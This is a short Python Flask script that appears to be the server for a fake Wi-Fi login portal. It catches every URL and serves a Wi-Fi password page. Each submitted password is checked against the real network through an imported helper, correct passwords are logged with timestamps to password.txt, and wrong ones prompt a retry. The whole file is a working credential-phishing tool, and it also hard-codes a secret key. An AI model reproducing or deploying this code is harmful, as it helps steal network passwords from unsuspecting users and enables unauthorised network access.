from flask import Flask, render_template, request, flash
import sys
from datetime import datetime
from isTrueWifi import verifyThePassword

app = Flask(__name__)
app.secret_key = '##3435))((4$$33@@@'  # Secret key for flashing messages
count = 0

def writeInFile(password):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("password.txt", "a") as file:
        file.write(password + "\ttime : " + time + "\n")

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'DELETE', 'PUT', 'PATCH'])
@app.route('/<path:path>', methods=['GET', 'POST', 'DELETE', 'PUT', 'PATCH'])
def handle_other_requests(path):
    if request.method == 'POST':
        password = request.form.get('password')
        if verifyThePassword(password):
            writeInFile(password)
        else:
            flash("Incorrect password")  # Flashing the message when the password is wrong
    return render_template("wifi.html")

if __name__ == "__main__":
    portValue = sys.argv[1]
    app.run(host='0.0.0.0', port=int(portValue))
